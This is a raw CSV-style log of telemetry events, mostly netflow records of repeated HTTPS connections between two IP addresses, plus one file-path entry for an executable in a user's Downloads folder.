c6bcb9bd-67e5-4a16-860e-7916aea8c176,{'netflow': '142.20.57.246:53292->202.6.172.98:443'},823585
88b05cf8-1aa5-4e99-88c0-06032ee47f46,{'netflow': '202.6.172.98:443->142.20.57.246:53966'},856354
87f1ddc7-60d5-4ab9-b14a-7e1aa98be43d,{'netflow': '142.20.57.246:53376->202.6.172.98:443'},829734
aad3f358-4f15-47d1-ae5c-659e774bc9db,{'netflow': '142.20.57.246:53925->202.6.172.98:443'},850218
a6244db5-38de-4b2d-a8d3-cb0aba00b9b6,{'netflow': '142.20.57.246:53875->202.6.172.98:443'},844076
e776f152-bdba-4221-8e36-ccc51cc59a33,{'netflow': '202.6.172.98:443->142.20.57.246:53875'},844077
08ddb839-af03-4350-b919-231b1ae365ba,{'netflow': '202.6.172.98:443->142.20.57.246:53925'},850223
5b2b2ecf-39b0-4f24-aa21-0d2b9e853144,{'netflow': '142.20.57.246:53447->202.6.172.98:443'},835893
c7674ed1-64f5-4e02-b74d-2c599afec50a,{'netflow': '142.20.57.246:53500->202.6.172.98:443'},842040
e260ef04-8a17-4eeb-996c-be7cbd620b57,{'netflow': '202.6.172.98:443->142.20.57.246:53500'},842041
2e0a43fd-2e1c-492f-80b4-5167553e4031,{'netflow': '142.20.57.246:54006->202.6.172.98:443'},860476
148bd655-c5fd-420b-808c-da9d66c9c706,{'netflow': '142.20.57.246:53250->202.6.172.98:443'},821567
b4ebd7a5-1616-4cd3-9b17-9b0ef1ba1309,{'netflow': '142.20.57.246:53400->202.6.172.98:443'},831807
2d46366a-2da6-4e9e-b6a6-41f2e2412d75,{'netflow': '202.6.172.98:443->142.20.57.246:53400'},831808
30aef542-1780-4a89-9e64-6fd74da98bf6,{'netflow': '202.6.172.98:443->142.20.57.246:53447'},835906
e34e7fe5-a7c5-4f6e-8484-2c247a0fffdc,{'netflow': '142.20.57.246:53344->202.6.172.98:443'},827715
ad4d43b0-726a-44c1-8712-130b1091ee88,{'netflow': '202.6.172.98:443->142.20.57.246:53343'},827718
7ea47bfe-bdbc-4b16-b609-63e29b3ee1dc,{'netflow': '202.6.172.98:443->142.20.57.246:54006'},860491
8a12102d-794e-47fa-8ebf-ef2ba71f7b7b,{'netflow': '202.6.172.98:443->142.20.57.246:53344'},827727
9ca79e14-3032-4928-97e1-cb8195325b96,{'netflow': '142.20.57.246:53434->202.6.172.98:443'},833883
e27f860d-b4b2-452e-9c9a-2ccf0924d3ba,{'netflow': '202.6.172.98:443->142.20.57.246:53376'},829804
24d3ce08-86ed-40ec-8235-27bad9c89c79,{'netflow': '142.20.57.246:53471->202.6.172.98:443'},837996
bcfb1be8-d3ea-43e4-af2f-4c66941c8cde,{'netflow': '202.6.172.98:443->142.20.57.246:53888'},846188
86f73a05-4b54-4560-a195-d6df8d456aea,{'netflow': '202.6.172.98:443->142.20.57.246:50057'},811375
26c820e3-35a1-443a-83b0-2c055e507011,{'netflow': '202.6.172.98:443->142.20.57.246:53292'},823664
f43ef225-d6dd-47e8-93f9-d558980dfabc,{'netflow': '202.6.172.98:443->142.20.57.246:53313'},825710
fc5fc9bc-62a7-406d-a68e-f53f86a36561,{'netflow': '202.6.172.98:443->142.20.57.246:53889'},846194
fb50bcde-f6aa-4180-8b16-ce4822022376,{'netflow': '142.20.57.246:49998->202.6.172.98:443'},809328
67acbbae-747b-4699-8aef-c2f95dd27f30,{'netflow': '202.6.172.98:443->142.20.57.246:53312'},825711
6ea27b58-bcc0-48c0-829a-c01d2dd4f054,{'netflow': '142.20.57.246:53889->202.6.172.98:443'},846193
d331d035-7e4d-4e61-9da7-b5287ada68a0,{'netflow': '202.6.172.98:443->142.20.57.246:49971'},805241
489c07f8-0ca9-4a81-aa92-8b26f5fc5cf7,{'netflow': '142.20.57.246:53939->202.6.172.98:443'},852351
94c522c4-fad3-4c32-b56f-66eca9ff2a6c,{'netflow': '142.20.57.246:53926->202.6.172.98:443'},850308
4d7a244b-9cb0-4894-9092-570552676b58,{'netflow': '202.6.172.98:443->142.20.57.246:53434'},833926
76955263-c3eb-4ba2-8ab3-df287fd2a7bf,{'netflow': '142.20.57.246:53449->202.6.172.98:443'},835977
ee3586c6-ee43-45eb-a09a-af8304e7e9ed,{'netflow': '202.6.172.98:443->142.20.57.246:53449'},835982
02a89915-f713-4c12-8c8a-b92e051c1ada,{'netflow': '142.20.57.246:53995->202.6.172.98:443'},858511
d4d41711-66db-4618-8c3f-441fb3790ab3,{'netflow': '202.6.172.98:443->142.20.57.246:53471'},838033
43236e24-6987-4fce-a3a8-c5a57d59395b,{'netflow': '142.20.57.246:54009->202.6.172.98:443'},860565
8bbfcde2-d952-4c71-9300-8a6eac107799,{'netflow': '142.20.57.246:53918->202.6.172.98:443'},848279
51f6c07b-de89-42b4-a46f-62abff720e5f,{'netflow': '142.20.57.246:53501->202.6.172.98:443'},842144
3bfec792-ca60-4762-9947-9e1f6e271075,{'netflow': '202.6.172.98:443->142.20.57.246:53501'},842145
eec87c3e-6d10-4a2e-98b0-0ea4b5893755,{'netflow': '202.6.172.98:443->142.20.57.246:53939'},852396
e16e34ce-2269-4314-b31a-7afb9f585b85,{'netflow': '142.20.57.246:53487->202.6.172.98:443'},840116
9b332521-fbda-4734-98f7-ed8e8f171069,{'netflow': '142.20.57.246:53502->202.6.172.98:443'},842164
5be22fee-d9cf-4f28-aed2-5d4c9ffe5f61,{'netflow': '142.20.57.246:53876->202.6.172.98:443'},844213
bca9c58d-10ec-46d0-9087-3afdf1192065,{'netflow': '202.6.172.98:443->142.20.57.246:53487'},840119
ec2f6d4b-1bd3-4af5-9a88-7979221b030c,{'netflow': '142.20.57.246:49984->202.6.172.98:443'},807352
612bba5b-ad08-42b2-8af2-111c9767cedb,{'netflow': '202.6.172.98:443->142.20.57.246:49984'},807353
cce41aab-e64b-4afc-b6df-bb3aace2b4a9,{'netflow': '202.6.172.98:443->142.20.57.246:53502'},842171
937ac57e-cb4a-409b-8bc9-bc661f0442b4,{'netflow': '202.6.172.98:443->142.20.57.246:53250'},821699
21c248b5-d2d0-491e-9259-9a9cc2e31c4f,{'netflow': '202.6.172.98:443->142.20.57.246:53876'},844234
97ab645e-054e-44a2-a4db-982c5940fa4e,{'netflow': '142.20.57.246:53896->202.6.172.98:443'},846290
8d6385a7-51ae-4b6d-b01d-9262fdd562ba,{'netflow': '142.20.57.246:53314->202.6.172.98:443'},825814
f60dcdc7-93b6-4185-ad59-28ead7e2c6d5,{'netflow': '142.20.57.246:53967->202.6.172.98:443'},856535
df737f2d-bd10-4b10-bf19-4ab396633183,{'netflow': '202.6.172.98:443->142.20.57.246:53314'},825815
ca80dde6-98be-455b-aa92-b7c29136aea6,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe'},94679
a195e01f-f37f-46b3-a2fc-e97601c1b52d,{'netflow': '142.20.57.246:53955->202.6.172.98:443'},854497
75c8a2f3-04d9-4e34-893e-9effe3882fde,{'netflow': '202.6.172.98:443->142.20.57.246:53918'},848354
93ab979b-3252-4e76-9d23-71b01555c8bb,{'netflow': '142.20.57.246:53315->202.6.172.98:443'},825826
a7164ea8-b944-4192-bec1-8a90d6c9de18,{'netflow': '202.6.172.98:443->142.20.57.246:53896'},846306
35be02da-74a8-4dc3-b29a-b384cddd6d39,{'netflow': '202.6.172.98:443->142.20.57.246:53315'},825835
fb1bcdf1-2302-46e6-8b98-a4aaed2d2bc7,{'netflow': '202.6.172.98:443->142.20.57.246:53955'},854510
3d446335-e53e-4cfb-9131-08265e2d397f,{'netflow': '202.6.172.98:443->142.20.57.246:49998'},809459
f9126526-9679-43fd-ab9a-bfb7a085570b,{'netflow': '202.6.172.98:443->142.20.57.246:54009'},860673
98e35f45-9d72-409a-8f49-83ee9f73781a,{'netflow': '142.20.57.246:53401->202.6.172.98:443'},832001
553d85ae-28a4-4c7d-acf7-4f263853530d,{'netflow': '202.6.172.98:443->142.20.57.246:53401'},832007
6b628901-8c09-46f6-91c1-ee62fcf2bc96,{'netflow': '202.6.172.98:443->142.20.57.246:53995'},858633
edd558c3-67bc-4af0-943c-e79c725cb4a6,{'netflow': '202.6.172.98:443->142.20.57.246:53967'},856587
ca3c9475-fc80-41ee-b46a-5e07ffbbe8b6,{'netflow': '142.20.57.246:53316->202.6.172.98:443'},825872
c11c4087-5f9f-4b46-9fed-7e81187c4a61,{'netflow': '142.20.57.246:53472->202.6.172.98:443'},838161
e1f4e70f-e3e9-4daf-8646-d453c678a7e2,{'netflow': '142.20.57.246:53317->202.6.172.98:443'},825873
179b2eed-c4ef-4849-bc8a-90fa9f5872f2,{'netflow': '142.20.57.246:53318->202.6.172.98:443'},825875
d23047e2-ad5b-4899-b867-4e51cff360a7,{'netflow': '202.6.172.98:443->142.20.57.246:53317'},825876
dae5e0cb-27a3-4705-a5b3-cf728af1aa85,{'netflow': '202.6.172.98:443->142.20.57.246:53316'},825877
413a3588-76aa-477a-9232-b1e0bda5a89a,{'netflow': '142.20.57.246:53319->202.6.172.98:443'},825878
f75a5a66-1045-44f5-89d2-29c5b6b8566c,{'netflow': '142.20.57.246:53320->202.6.172.98:443'},825879
a1625067-c49d-4434-864e-848d86b73866,{'netflow': '202.6.172.98:443->142.20.57.246:53318'},825880
bfffe44a-1614-4c1d-bec8-ce9a68aba040,{'netflow': '202.6.172.98:443->142.20.57.246:53319'},825883
a02d4380-b76c-463d-affe-958354b447d3,{'netflow': '202.6.172.98:443->142.20.57.246:53320'},825884
d7c2a23a-748c-49e9-9b7d-b19779e62502,{'netflow': '142.20.57.246:53323->202.6.172.98:443'},825891
bec61871-4f7b-4427-bf8a-082b8652744a,{'netflow': '142.20.57.246:53378->202.6.172.98:443'},829992
ff1a5365-cdbc-4e67-b76d-e59a98c68a2d,{'netflow': '142.20.57.246:49985->202.6.172.98:443'},807465
9c40df1a-ae87-4605-a44d-f2a7e4f1d2b8,{'netflow': '202.6.172.98:443->142.20.57.246:53323'},825900
b448f588-0b38-4653-a520-fd82d3f42b7a,{'netflow': '142.20.57.246:53324->202.6.172.98:443'},825901
5d1d1232-3165-4910-b982-2399004452b1,{'netflow': '142.20.57.246:50071->202.6.172.98:443'},811566
7d65d936-0757-4bb7-bce4-c2964055e421,{'netflow': '142.20.57.246:50072->202.6.172.98:443'},811567
81c79526-542b-4bb3-bbd2-ce923b6da3df,{'netflow': '142.20.57.246:53503->202.6.172.98:443'},842285
20f749a4-879f-4eea-9411-31564a49a79b,{'netflow': '142.20.57.246:49972->202.6.172.98:443'},805425
3d3d414b-69fa-41bb-be71-a5862b26a0c6,{'netflow': '142.20.57.246:53345->202.6.172.98:443'},827954
aa934b14-4d67-4ed5-a6b1-804c1e0bec31,{'netflow': '202.6.172.98:443->142.20.57.246:53324'},825906
e9f148c3-b262-44fe-9665-bb32b3c84a61,{'netflow': '202.6.172.98:443->142.20.57.246:53472'},838200
8f51fc28-a92e-4145-a6ca-bb7853bd5685,{'netflow': '142.20.57.246:54012->202.6.172.98:443'},860732
914609da-70a8-468d-ab4e-5815b4d6de8b,{'netflow': '202.6.172.98:443->142.20.57.246:49972'},805436
41bf7ac5-9b67-4cda-8b21-e4673d7ef57a,{'netflow': '202.6.172.98:443->142.20.57.246:50071'},811583
e01b9128-0065-4a14-ba10-863f2bc813b3,{'netflow': '202.6.172.98:443->142.20.57.246:50072'},811584
6aabc3cd-ebd6-45f8-b483-dda9b9d05bff,{'netflow': '142.20.57.246:53877->202.6.172.98:443'},844351
2209b75c-72fb-4bcd-9df8-11d52b39d227,{'netflow': '202.6.172.98:443->142.20.57.246:53877'},844354
b9f77069-1af7-452e-8b46-b4f98fa8ec46,{'netflow': '142.20.57.246:53956->202.6.172.98:443'},854597
0ebfc37c-43fb-4573-ab96-45baeec17bf6,{'netflow': '142.20.57.246:53488->202.6.172.98:443'},840262
de10aa49-1d8a-49e8-a64b-102798668f71,{'netflow': '142.20.57.246:53450->202.6.172.98:443'},836167
d6ae8968-bb5b-49a4-9fc4-d1da066961e7,{'netflow': '202.6.172.98:443->142.20.57.246:53956'},854600
7adeeb2e-7b92-469b-a9c0-e868ddf4c84e,{'netflow': '202.6.172.98:443->142.20.57.246:53450'},836168
6a48b1ba-a6cf-4257-a308-905efe9a0664,{'netflow': '142.20.57.246:53299->202.6.172.98:443'},823888
7e31fff5-8158-4a5a-b47b-31d42e34a91d,{'netflow': '202.6.172.98:443->142.20.57.246:49985'},807505
ee95e905-a84b-4fdb-9e8b-385aa89a127a,{'netflow': '142.20.57.246:53379->202.6.172.98:443'},830033
134978b1-0d1e-4e35-b4d5-9b9067ff2cdf,{'netflow': '202.6.172.98:443->142.20.57.246:53299'},823891
0438d82d-c332-45b2-8b31-a05132f7c877,{'netflow': '202.6.172.98:443->142.20.57.246:53503'},842324
f7eba821-d585-49ff-bed7-8cdd0985a2dd,{'netflow': '202.6.172.98:443->142.20.57.246:54012'},860755
9d3eabd8-1ad6-4972-bd0f-53bcccc6fce8,{'netflow': '142.20.57.246:53899->202.6.172.98:443'},846423
625c39df-f913-4201-ac97-aedc0a63eeba,{'netflow': '142.20.57.246:49986->202.6.172.98:443'},807513
066aad08-642c-4bf8-901f-bc59c68fb868,{'netflow': '142.20.57.246:53325->202.6.172.98:443'},825945
f08cae4f-c56c-4af9-8a8e-b8b5dd776fdd,{'netflow': '202.6.172.98:443->142.20.57.246:49986'},807516
eb7d9277-8346-4d24-8cdb-48d6d2a44bae,{'netflow': '202.6.172.98:443->142.20.57.246:53926'},850525
9a64d3d3-892f-4944-a087-406c6f768654,{'netflow': '202.6.172.98:443->142.20.57.246:53378'},830048
2b1e785b-0631-4508-9e37-0a6b3f4f3153,{'netflow': '202.6.172.98:443->142.20.57.246:53379'},830049
a78ee0ec-e73a-42aa-b39b-0599e6077439,{'netflow': '142.20.57.246:53927->202.6.172.98:443'},850528
